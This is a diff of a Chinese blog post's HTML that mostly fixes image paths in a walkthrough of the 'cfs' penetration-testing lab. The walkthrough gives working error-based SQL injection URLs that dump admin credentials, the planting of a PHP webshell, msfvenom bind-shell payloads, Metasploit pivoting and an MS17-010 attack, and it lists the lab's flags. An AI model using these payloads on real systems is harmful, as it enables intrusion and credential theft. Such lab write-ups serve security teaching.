@@ -281,102 +281,102 @@ MathJax = {
 <p>先加’，报错，说明存在交互：</p>
 <p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/40.png" style="zoom:67%;"></p>
 <p>但在测试1=2时候发现与预想页面不一致：</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\41.png" alt></p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\42.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/41.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/42.png" alt></p>
 <p>将—+改为#试试：</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\43.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/43.png" alt></p>
 <p>根据页面结果得知是字符型。页面虽然有东西，但是只有对于请求对错出现不一样页面其余的就没有了，页面无回显位，考虑报错注入。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1%20%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%20%20--+</span><br></pre></td></tr></table></figure>
 <p>这时候#又不行了换回—+，爆出数据库bagecms</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\44.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/44.png" alt></p>
 <p>爆出表bage_admin</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1%20%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27bagecms%27),0x7e),1)%20%20--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\45.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/45.png" alt></p>
 <p>爆列</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1%20%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27bagecms%27%20and%20table_name=%27bage_admin%27),0x7e),1)%20%20--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\46.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/46.png" alt></p>
 <p>爆出账户名和密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1%20%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username,password)%20from%20bage_admin),0x7e),1)%20%20--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\47.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/47.png" alt></p>
 <p>‘~admin46f94c8de14fb36680850768ff’右边的~没出来，修改命令，显示右边十位：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1%27%20%20and%20%20updatexml(1,concat(0x7e,right((select%20group_concat(username,%27--%27,password)%20from%20bagecms.bage_admin),10),0x7e),1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\55.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/55.png" alt></p>
 <p>‘~68ff1b7f2a~’</p>
 <p>拼接获得完整的密码：’~admin46f94c8de14fb36680850768ff1b7f2a’</p>
 <p>利用md5解密，得到密码123qwe</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\54.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/54.png" alt></p>
 <p>获得这个网站的账号密码就需要找到后台登录页面，利用御剑，得到这个网站的webshell</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\50.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/50.png" alt></p>
 <p>在robots.txt上面找到了登录地址</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\51.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/51.png" alt></p>
 <p>在连接上加上/index.php?r=admini后访问，跳转到如下页面，使用获取的账户密码登录：</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\52.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/52.png" alt></p>
 <h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h5><p>管理后台中</p>
 <p>得到第四个flag： flag{eS3sd1IKarw}</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\56.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/56.png" alt></p>
 <p>在模板处写入一句话木马后提交：</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\58.png" alt></p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\59.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/58.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/59.png" alt></p>
 <p>发现使用了很多模块化文件，而且都是php格式，直接在其中的一个php文件中加入一句话木马，再访问该文件位置，并用蚁剑连接：</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\60.png" alt></p>
-<p>但因为这里只是靶场，用的都是虚拟机的仅主机模式，所以蚁剑可以直接连接，平时正常情况下是不行的，需要给蚁剑配置kali一样的代理，这里是靶场就不需要了<br><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\61.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/60.png" alt></p>
+<p>但因为这里只是靶场，用的都是虚拟机的仅主机模式，所以蚁剑可以直接连接，平时正常情况下是不行的，需要给蚁剑配置kali一样的代理，这里是靶场就不需要了<br><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/61.png" alt></p>
 <p>这里就拿到了webshell的权限</p>
 <h4 id="获得ubuntu主机权限"><a href="#获得ubuntu主机权限" class="headerlink" title="获得ubuntu主机权限"></a>获得ubuntu主机权限</h4><p>拿下了webshell，便开始拿主机权限</p>
 <p>同理，我们再生成针对Ubuntu的木马，目标是22网段（注意木马的shell只能采取正向连接，因为我们是搭建隧道来访问Ubuntu）（因为正常访问是访问不到的，但是它处于内网中也访问不到我们。即通过它来连接我们是不行的，而且让他通过隧道来找我们也不行。还是得我们通过隧道去找他，所以只能正向）</p>
 <p>msf生成上传木马，获取shell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp……</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\62.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/62.png" alt></p>
 <p>同样的msf新开一个页面开启监听，但是这里要注意，msf新开一个页面后之前的那个页面的所有东西都用不了，所以不能直接msfconsole打开，msf这里也需要走代理 ，就是在用proxychains msfconsole来启动msf：</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\63.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/63.png" alt></p>
 <p>再设置payload，设置lport，设置phost，即可开启监听</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.129</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\64.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/64.png" alt></p>
 <p>发现一直被拒绝</p>
 <p>将kali生成的2.elf粘贴到windows中，注意要关闭病毒威胁，否则拖不进去。再将用蚁剑将生成的木马2.elf上传到ubuntu</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\67.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/67.png" alt></p>
 <h5 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h5><p>网站根目录下</p>
 <p>flag42Fs.txt放着第五个flag{23ASfqwr4t2e}</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\84.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/84.png" alt></p>
 <h5 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h5><p>系统根目录下</p>
 <p>flag{1a2saA23eas}</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\89.png" alt></p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\90.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/89.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/90.png" alt></p>
 <h5 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h5><p>日志文件中</p>
 <p>flag{fAiLdaskdaew}</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\91.png" alt></p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\92.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/91.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/92.png" alt></p>
 <h5 id="flag8"><a href="#flag8" class="headerlink" title="flag8"></a>flag8</h5><p>passwd文件中</p>
 <h5 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h5><p>crontab文件中</p>
 <p>并打开终端执行这个木马：</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\68.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/68.png" alt></p>
 <p>即可回弹shell</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\71.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/71.png" alt></p>
 <p>至此成功拿下ubuntu的主机权限，那么就只剩下一台windows7了</p>
 <h3 id="打穿win7"><a href="#打穿win7" class="headerlink" title="打穿win7"></a>打穿win7</h3><h4 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h4><p>看网络接口，发现还有33网段，这便是搭建的windows7</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\72.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/72.png" alt></p>
 <p>用蚁剑也可以查看</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\70.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/70.png" alt></p>
 <h4 id="msf代理配置"><a href="#msf代理配置" class="headerlink" title="msf代理配置"></a>msf代理配置</h4><p>重复拿centos的shell的操作，继续给他创建一个33段的路由，配置代理</p>
 <p>run autoroute -s 192.168.33.0/24</p>
 <p>run autoroute -p</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\73.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/73.png" alt></p>
 <p>开启msf的代理模块：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvport 5555</span><br><span class="line">set version 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\74.png" alt></p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\75.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/74.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/75.png" alt></p>
 <p>修改配置文件：</p>
 <p>vi /etc/proxychains4.conf</p>
 <p>192.168.11.129 5555</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\77.png" alt></p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\76.png" alt></p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\83.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/77.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/76.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/83.png" alt></p>
 <h4 id="获取主机权限-1"><a href="#获取主机权限-1" class="headerlink" title="获取主机权限"></a>获取主机权限</h4><p>新开页面，可以使用msf自带的一些tcp扫描模块或者nmap都可以，注意这里的msf开启时也需要走刚创建的那个代理 ，探测到445端口开放，又是win7系统，自然想到永恒之蓝漏洞（ms17-010），这里直接使用msf自带的永恒之蓝攻击</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">proxychains msfconsole</span><br><span class="line">search ms17-010</span><br><span class="line">use 1</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.33.33</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\78.png" alt></p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\79.png" alt></p>
-<p> <img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\81.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/78.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/79.png" alt></p>
+<p> <img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/81.png" alt></p>
 <p>出现乱码</p>
-<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/blog/source\_posts\cfs靶场\82.png" alt></p>
+<p><img src="/2023/09/18/cfs%E9%9D%B6%E5%9C%BA/82.png" alt></p>
 <p>得到最后的flag，至此靶场打穿，成功通关 </p>
 <h5 id="flag10-12"><a href="#flag10-12" class="headerlink" title="flag10-12"></a>flag10-12</h5><p>flag{saDd12fEsef}</p>
 <p>flag{2wAdK32Lsd}</p>
